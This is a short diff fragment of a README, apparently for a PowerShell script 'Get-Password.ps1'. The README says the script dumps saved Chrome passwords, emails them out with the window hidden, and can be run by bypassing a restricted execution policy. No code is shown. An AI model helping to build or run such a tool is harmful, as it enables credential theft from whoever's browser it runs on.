@@ -4,6 +4,7 @@ It dumps the saved chrome password and email it to you while keeping the windows
 # Usage:
 
 Powershell.exe ./Get-Password.ps1
+
 Bypass the execution policy if its restricted
 
 # Note: 
